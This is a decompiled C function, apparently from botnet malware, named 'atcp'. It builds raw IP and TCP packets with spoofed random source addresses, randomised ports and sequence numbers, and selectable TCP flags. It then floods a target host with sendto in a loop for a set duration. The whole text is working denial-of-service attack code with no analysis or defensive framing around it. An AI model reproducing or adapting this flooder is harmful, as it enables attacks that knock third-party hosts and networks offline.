
void atcp(undefined8 param_1,int param_2,int param_3,int param_4,byte *param_5,int param_6,
         int param_7)

{
  long lVar1;
  uint16_t __hostshort;
  size_t __n;
  void *pvVar2;
  undefined2 *puVar3;
  byte bVar4;
  undefined2 uVar5;
  int iVar6;
  uint32_t uVar7;
  undefined4 uVar8;
  time_t tVar9;
  long lVar10;
  byte *pbVar11;
  byte *pbVar12;
  byte *pbVar13;
  bool bVar14;
  bool bVar15;
  bool bVar16;
  undefined8 auStack336 [2];
  undefined1 *local_140;
  byte *local_138;
  undefined8 local_130;
  undefined1 *local_128;
  byte *local_120;
  undefined8 local_118;
  undefined1 *local_110;
  byte *local_108;
  undefined8 local_100;
  undefined1 *local_f8;
  byte *local_f0;
  undefined8 local_e8;
  undefined1 *local_e0;
  byte *local_d8;
  undefined8 local_d0;
  undefined1 *local_c8;
  byte *local_c0;
  size_t local_b8;
  void *local_b0;
  uint16_t local_a2;
  undefined8 *local_a0;
  int local_94;
  int local_90;
  int local_8c;
  byte *local_88;
  int local_7c;
  int local_78;
  int local_74;
  undefined8 local_70;
  undefined4 local_5c;
  undefined local_58 [4];
  undefined4 local_54;
  undefined8 local_50;
  void *local_48;
  int local_40;
  int local_3c;
  void *local_38;
  undefined2 *local_30;
  int local_24;
  byte *local_20;
  
  local_a0 = auStack336 + 1;
  local_94 = param_7;
  local_58._0_2_ = 2;
  local_8c = param_6;
  local_88 = param_5;
  local_7c = param_4;
  local_78 = param_3;
  local_74 = param_2;
  local_70 = param_1;
  if (param_2 == 0) {
    auStack336[0] = 0x4036dd;
    local_a0 = auStack336 + 1;
    local_58._2_2_ = rand_cmwc();
  }
  else {
    auStack336[0] = 0x4036ee;
    local_58._2_2_ = htons((uint16_t)param_2);
  }
  auStack336[0] = 0x403703;
  iVar6 = getHost(local_70,&local_54);
  if (iVar6 == 0) {
    local_50 = 0;
    auStack336[0] = 0x40372f;
    local_40 = socket(2,3,6);
    if (local_40 != 0) {
      local_5c = 1;
      auStack336[0] = 0x403760;
      iVar6 = setsockopt(local_40,0,3,&local_5c,4);
      if (-1 < iVar6) {
        if (local_7c == 0) {
          local_3c = 0;
        }
        else {
          local_3c = -(1 << (-(char)local_7c & 0x1fU));
        }
        local_b8 = (long)local_8c + 0x28;
        lVar1 = -((long)local_8c + 0x46U & 0xfffffffffffffff0);
        local_b0 = (void *)((long)&local_140 + lVar1);
        local_48 = local_b0;
        local_38 = local_b0;
        local_30 = (undefined2 *)((long)&local_130 + lVar1 + 4);
        iVar6 = local_8c + 0x14;
        *(undefined8 *)((long)auStack336 + lVar1) = 0x40380e;
        uVar7 = getRandomIP();
        *(undefined8 *)((long)auStack336 + lVar1) = 0x403815;
        uVar7 = htonl(uVar7);
        pvVar2 = local_38;
        *(undefined8 *)((long)auStack336 + lVar1) = 0x40382b;
        makeIPPacket(pvVar2,local_54,uVar7,6,iVar6);
        *(undefined8 *)((long)auStack336 + lVar1) = 0x403830;
        uVar5 = rand_cmwc();
        *local_30 = uVar5;
        *(undefined8 *)((long)auStack336 + lVar1) = 0x40383e;
        uVar8 = rand_cmwc();
        pbVar12 = local_88;
        *(undefined4 *)(local_30 + 2) = uVar8;
        *(undefined4 *)(local_30 + 4) = 0;
        bVar14 = false;
        bVar4 = *(byte *)(local_30 + 6) & 0xf | 0x50;
        bVar16 = bVar4 == 0;
        *(byte *)(local_30 + 6) = bVar4;
        local_c0 = local_88;
        local_c8 = &DAT_0041514e;
        local_d0 = 4;
        lVar10 = 4;
        pbVar11 = local_88;
        pbVar13 = &DAT_0041514e;
        do {
          if (lVar10 == 0) break;
          lVar10 = lVar10 + -1;
          bVar14 = *pbVar11 < *pbVar13;
          bVar16 = *pbVar11 == *pbVar13;
          pbVar11 = pbVar11 + 1;
          pbVar13 = pbVar13 + 1;
        } while (bVar16);
        if ((!bVar14 && !bVar16) == bVar14) {
          *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 2;
          *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 4;
          *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 1;
          *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 0x10;
          *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 8;
        }
        else {
          *(undefined8 *)((long)auStack336 + lVar1) = 0x403908;
          local_20 = (byte *)strtok((char *)pbVar12,",");
          while( true ) {
            bVar14 = false;
            bVar16 = local_20 == (byte *)0x0;
            if (bVar16) break;
            local_d8 = local_20;
            local_e0 = &DAT_00415154;
            local_e8 = 4;
            lVar10 = 4;
            pbVar12 = local_20;
            pbVar11 = &DAT_00415154;
            do {
              if (lVar10 == 0) break;
              lVar10 = lVar10 + -1;
              bVar14 = *pbVar12 < *pbVar11;
              bVar16 = *pbVar12 == *pbVar11;
              pbVar12 = pbVar12 + 1;
              pbVar11 = pbVar11 + 1;
            } while (bVar16);
            bVar15 = false;
            bVar14 = (!bVar14 && !bVar16) == bVar14;
            if (bVar14) {
              *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 2;
            }
            else {
              local_f0 = local_20;
              local_f8 = &DAT_00415158;
              local_100 = 4;
              lVar10 = 4;
              pbVar12 = local_20;
              pbVar11 = &DAT_00415158;
              do {
                if (lVar10 == 0) break;
                lVar10 = lVar10 + -1;
                bVar15 = *pbVar12 < *pbVar11;
                bVar14 = *pbVar12 == *pbVar11;
                pbVar12 = pbVar12 + 1;
                pbVar11 = pbVar11 + 1;
              } while (bVar14);
              bVar16 = false;
              bVar14 = (!bVar15 && !bVar14) == bVar15;
              if (bVar14) {
                *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 4;
              }
              else {
                local_108 = local_20;
                local_110 = &DAT_0041515c;
                local_118 = 4;
                lVar10 = 4;
                pbVar12 = local_20;
                pbVar11 = &DAT_0041515c;
                do {
                  if (lVar10 == 0) break;
                  lVar10 = lVar10 + -1;
                  bVar16 = *pbVar12 < *pbVar11;
                  bVar14 = *pbVar12 == *pbVar11;
                  pbVar12 = pbVar12 + 1;
                  pbVar11 = pbVar11 + 1;
                } while (bVar14);
                bVar15 = false;
                bVar14 = (!bVar16 && !bVar14) == bVar16;
                if (bVar14) {
                  *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 1;
                }
                else {
                  local_120 = local_20;
                  local_128 = &DAT_00415160;
                  local_130 = 4;
                  lVar10 = 4;
                  pbVar12 = local_20;
                  pbVar11 = &DAT_00415160;
                  do {
                    if (lVar10 == 0) break;
                    lVar10 = lVar10 + -1;
                    bVar15 = *pbVar12 < *pbVar11;
                    bVar14 = *pbVar12 == *pbVar11;
                    pbVar12 = pbVar12 + 1;
                    pbVar11 = pbVar11 + 1;
                  } while (bVar14);
                  bVar16 = false;
                  bVar14 = (!bVar15 && !bVar14) == bVar15;
                  if (bVar14) {
                    *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 0x10;
                  }
                  else {
                    local_138 = local_20;
                    local_140 = &DAT_00415164;
                    auStack336[1] = 4;
                    lVar10 = 4;
                    pbVar12 = local_20;
                    pbVar11 = &DAT_00415164;
                    do {
                      if (lVar10 == 0) break;
                      lVar10 = lVar10 + -1;
                      bVar16 = *pbVar12 < *pbVar11;
                      bVar14 = *pbVar12 == *pbVar11;
                      pbVar12 = pbVar12 + 1;
                      pbVar11 = pbVar11 + 1;
                    } while (bVar14);
                    if ((!bVar16 && !bVar14) == bVar16) {
                      *(byte *)((long)local_30 + 0xd) = *(byte *)((long)local_30 + 0xd) | 8;
                    }
                  }
                }
              }
            }
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403af3;
            local_20 = (byte *)strtok((char *)0x0,",");
          }
        }
        *(undefined8 *)((long)auStack336 + lVar1) = 0x403b07;
        uVar5 = rand_cmwc();
        local_30[7] = uVar5;
        local_30[8] = 0;
        local_30[9] = 0;
        if (local_74 == 0) {
          *(undefined8 *)((long)auStack336 + lVar1) = 0x403b30;
          local_a2 = rand_cmwc();
        }
        else {
          __hostshort = (uint16_t)local_74;
          *(undefined8 *)((long)auStack336 + lVar1) = 0x403b44;
          local_a2 = htons(__hostshort);
        }
        puVar3 = local_30;
        pvVar2 = local_38;
        local_30[1] = local_a2;
        *(undefined8 *)((long)auStack336 + lVar1) = 0x403b67;
        uVar5 = tcpcsum(pvVar2,puVar3);
        pvVar2 = local_48;
        local_30[8] = uVar5;
        uVar5 = *(undefined2 *)((long)local_38 + 2);
        *(undefined8 *)((long)auStack336 + lVar1) = 0x403b88;
        uVar5 = csum(pvVar2,uVar5);
        *(undefined2 *)((long)local_38 + 10) = uVar5;
        *(undefined8 *)((long)auStack336 + lVar1) = 0x403b9c;
        tVar9 = time((time_t *)0x0);
        local_24 = (int)tVar9 + local_78;
        local_90 = 0;
        while( true ) {
          while( true ) {
            iVar6 = local_40;
            pvVar2 = local_48;
            __n = local_b8;
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403bd8;
            sendto(iVar6,pvVar2,__n,0,(sockaddr *)local_58,0x10);
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403be0;
            uVar7 = getRandomIP();
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403be7;
            uVar7 = htonl(uVar7);
            *(uint32_t *)((long)local_38 + 0xc) = uVar7;
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403bf5;
            uVar5 = rand_cmwc();
            *(undefined2 *)((long)local_38 + 4) = uVar5;
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403c04;
            uVar8 = rand_cmwc();
            *(undefined4 *)(local_30 + 2) = uVar8;
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403c12;
            uVar5 = rand_cmwc();
            puVar3 = local_30;
            pvVar2 = local_38;
            *local_30 = uVar5;
            local_30[8] = 0;
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403c32;
            uVar5 = tcpcsum(pvVar2,puVar3);
            pvVar2 = local_48;
            local_30[8] = uVar5;
            uVar5 = *(undefined2 *)((long)local_38 + 2);
            *(undefined8 *)((long)auStack336 + lVar1) = 0x403c53;
            uVar5 = csum(pvVar2,uVar5);
            *(undefined2 *)((long)local_38 + 10) = uVar5;
            if (local_90 == local_94) break;
            local_90 = local_90 + 1;
          }
          *(undefined8 *)((long)auStack336 + lVar1) = 0x403c75;
          tVar9 = time((time_t *)0x0);
          if (local_24 < tVar9) break;
          local_90 = 0;
        }
      }
    }
  }
  return;
}

